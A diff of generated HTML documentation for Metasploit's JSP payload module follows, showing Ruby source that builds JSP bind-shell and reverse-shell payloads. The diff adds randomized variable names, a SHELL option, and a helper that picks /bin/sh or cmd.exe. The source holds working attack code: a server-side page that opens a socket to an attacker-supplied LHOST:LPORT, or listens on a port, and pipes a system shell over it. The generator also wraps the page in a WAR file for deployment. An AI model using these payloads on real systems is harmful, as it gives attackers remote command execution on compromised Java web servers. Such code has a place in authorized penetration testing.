@@ -84,7 +84,19 @@
 </dl>
 <div class="clear"></div>
 
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>This module is chained within JSP payloads that target the Java platform.
+It provides methods to generate Java / JSP code.</p>
 
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
 
 
 
@@ -119,6 +131,28 @@
     <span class="summary_desc"><div class='inline'>
 <p>Wraps the jsp payload into a war.</p>
 </div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">- (Object) <strong>initialize</strong>(info = {}) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
   
 </li>
 
@@ -166,6 +200,30 @@
   
     <span class="summary_desc"><div class='inline'>
 <p>Outputs jsp code that spawns a reverse TCP shell.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#shell_path-instance_method" title="#shell_path (instance method)">- (String) <strong>shell_path</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Outputs Java code to assign the system shell path to a variable.</p>
 </div></span>
   
 </li>
@@ -224,32 +282,32 @@
       <pre class="lines">
 
 
-131
-132
-133
-134
-135
-136
-137
-138
-139
-140
-141
-142
-143
-144
-145
-146
-147
-148
-149
-150
-151
-152
-153</pre>
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 131</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 163</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_generate_war'>generate_war</span>
   <span class='id identifier rubyid_jsp_name'>jsp_name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span><span class='op'>+</span><span class='int'>8</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>.jsp</span><span class='tstring_end'>&quot;</span></span>
@@ -273,6 +331,74 @@
   <span class='id identifier rubyid_zip'>zip</span><span class='period'>.</span><span class='id identifier rubyid_add_file'>add_file</span><span class='lparen'>(</span><span class='id identifier rubyid_jsp_name'>jsp_name</span><span class='comma'>,</span> <span class='id identifier rubyid_generate'>generate</span><span class='rparen'>)</span>
 
   <span class='id identifier rubyid_zip'>zip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    - (<tt>Object</tt>) <strong>initialize</strong>(info = {}) 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>info</span>
+      
+      
+        <span class='type'>(<tt>Hash&lt;Symbol, [String, nil]&gt;</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+    </li>
+  
+</ul>
+
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+10
+11
+12
+13
+14
+15
+16
+17
+18</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 10</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ret'>ret</span> <span class='op'>=</span> <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span><span class='lbracket'>[</span>
+    <span class='const'>Msf</span><span class='op'>::</span><span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>The system shell to use.</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Payload</span><span class='op'>::</span><span class='const'>JSP</span> <span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_ret'>ret</span>
 <span class='kw'>end</span></pre>
     </td>
   </tr>
@@ -323,21 +449,6 @@
       <pre class="lines">
 
 
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
 23
 24
 25
@@ -382,14 +493,42 @@
 64
 65
 66
-67</pre>
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 8</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 23</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_jsp_bind_tcp'>jsp_bind_tcp</span>
   <span class='comment'># Modified from: http://www.security.org.sg/code/jspreverse.html
-</span>  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+</span>
+  <span class='id identifier rubyid_var_is'>var_is</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_os'>var_os</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_in'>var_in</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_out'>var_out</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
 <span class='tstring_content'>&lt;%@page import=&quot;java.lang.*&quot;%&gt;
 &lt;%@page import=&quot;java.util.*&quot;%&gt;
 &lt;%@page import=&quot;java.io.*&quot;%&gt;
@@ -398,54 +537,55 @@
 &lt;%
 class StreamConnector extends Thread
 {
-  InputStream is;
-  OutputStream os;
+  InputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
+  OutputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
 
-  StreamConnector( InputStream is, OutputStream os )
+  StreamConnector( InputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>, OutputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> )
   {
-    this.is = is;
-    this.os = os;
+    this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'> = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
+    this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
   }
 
   public void run()
   {
-    BufferedReader in  = null;
-    BufferedWriter out = null;
+    BufferedReader </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>  = null;
+    BufferedWriter </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> = null;
     try
     {
-      in  = new BufferedReader( new InputStreamReader( this.is ) );
-      out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>  = new BufferedReader( new InputStreamReader( this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'> ) );
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> = new BufferedWriter( new OutputStreamWriter( this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> ) );
       char buffer[] = new char[8192];
       int length;
-      while( ( length = in.read( buffer, 0, buffer.length ) ) &gt; 0 )
+      while( ( length = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>.read( buffer, 0, buffer.length ) ) &gt; 0 )
       {
-        out.write( buffer, 0, length );
-        out.flush();
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.write( buffer, 0, length );
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.flush();
       }
     } catch( Exception e ){}
     try
     {
-      if( in != null )
-        in.close();
-      if( out != null )
-        out.close();
+      if( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'> != null )
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>.close();
+      if( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> != null )
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.close();
     } catch( Exception e ){}
   }
 }
 
 try
 {
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_path'>shell_path</span><span class='embexpr_end'>}</span><span class='tstring_content'>
   ServerSocket server_socket = new ServerSocket( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='embexpr_end'>}</span><span class='tstring_content'> );
   Socket client_socket = server_socket.accept();
   server_socket.close();
-  Process process = Runtime.getRuntime().exec( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot; );
+  Process process = Runtime.getRuntime().exec( ShellPath );
   ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
   ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
 } catch( Exception e ) {}
 %&gt;
 </span><span class='heredoc_end'>  EOS
 </span>
-  <span class='kw'>return</span> <span class='id identifier rubyid_jsp'>jsp</span>
+  <span class='id identifier rubyid_jsp'>jsp</span>
 <span class='kw'>end</span></pre>
     </td>
   </tr>
@@ -496,29 +636,6 @@ try
       <pre class="lines">
 
 
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
-81
-82
-83
-84
-85
-86
-87
-88
-89
-90
-91
-92
-93
 94
 95
 96
@@ -552,14 +669,51 @@ try
 124
 125
 126
-127</pre>
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 71</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 94</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_jsp_reverse_tcp'>jsp_reverse_tcp</span>
   <span class='comment'># JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
-</span>  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+</span>
+  <span class='id identifier rubyid_var_is'>var_is</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_os'>var_os</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_in'>var_in</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_var_out'>var_out</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
 <span class='tstring_content'>&lt;%@page import=&quot;java.lang.*&quot;%&gt;
 &lt;%@page import=&quot;java.util.*&quot;%&gt;
 &lt;%@page import=&quot;java.io.*&quot;%&gt;
@@ -568,51 +722,141 @@ try
 &lt;%
 class StreamConnector extends Thread
 {
-  InputStream is;
-  OutputStream os;
+  InputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
+  OutputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
 
-  StreamConnector( InputStream is, OutputStream os )
+  StreamConnector( InputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>, OutputStream </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> )
   {
-    this.is = is;
-    this.os = os;
+    this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'> = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
+    this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
   }
 
   public void run()
   {
-    BufferedReader in  = null;
-    BufferedWriter out = null;
+    BufferedReader </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>  = null;
+    BufferedWriter </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> = null;
     try
     {
-      in  = new BufferedReader( new InputStreamReader( this.is ) );
-      out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>  = new BufferedReader( new InputStreamReader( this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_is'>var_is</span><span class='embexpr_end'>}</span><span class='tstring_content'> ) );
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> = new BufferedWriter( new OutputStreamWriter( this.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_os'>var_os</span><span class='embexpr_end'>}</span><span class='tstring_content'> ) );
       char buffer[] = new char[8192];
       int length;
-      while( ( length = in.read( buffer, 0, buffer.length ) ) &gt; 0 )
+      while( ( length = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>.read( buffer, 0, buffer.length ) ) &gt; 0 )
       {
-        out.write( buffer, 0, length );
-        out.flush();
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.write( buffer, 0, length );
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.flush();
       }
     } catch( Exception e ){}
     try
     {
-      if( in != null )
-        in.close();
-      if( out != null )
-        out.close();
+      if( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'> != null )
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_in'>var_in</span><span class='embexpr_end'>}</span><span class='tstring_content'>.close();
+      if( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'> != null )
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_out'>var_out</span><span class='embexpr_end'>}</span><span class='tstring_content'>.close();
     } catch( Exception e ){}
   }
 }
 
 try
 {
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_path'>shell_path</span><span class='embexpr_end'>}</span><span class='tstring_content'>
   Socket socket = new Socket( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='embexpr_end'>}</span><span class='tstring_content'> );
-  Process process = Runtime.getRuntime().exec( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot; );
+  Process process = Runtime.getRuntime().exec( ShellPath );
   ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
   ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
 } catch( Exception e ) {}
 %&gt;
 </span><span class='heredoc_end'>  EOS
-</span>  <span class='kw'>return</span> <span class='id identifier rubyid_jsp'>jsp</span>
+</span>
+  <span class='id identifier rubyid_jsp'>jsp</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="shell_path-instance_method">
+  
+    - (<tt>String</tt>) <strong>shell_path</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Outputs Java code to assign the system shell path to a variable.</p>
+
+<p>It uses the datastore if a value has been provided, otherwise tries to
+guess the system shell path bad on the os target.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the Java code.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 193</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_shell_path'>shell_path</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+    <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>String ShellPath = \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot;;</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>String ShellPath;
+if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) {
+ShellPath = new String(&quot;/bin/sh&quot;);
+} else {
+ShellPath = new String(&quot;cmd.exe&quot;);
+}
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_jsp'>jsp</span>
 <span class='kw'>end</span></pre>
     </td>
   </tr>
@@ -624,9 +868,9 @@ try
 </div>
 
     <div id="footer">
-  Generated on Wed Sep  3 01:51:04 2014 by
+  Generated on Tue Dec  2 09:34:30 2014 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
-  0.8.7.4 (ruby-2.1.2).
+  0.8.7.4 (ruby-2.1.5).
 </div>
 
   </body>
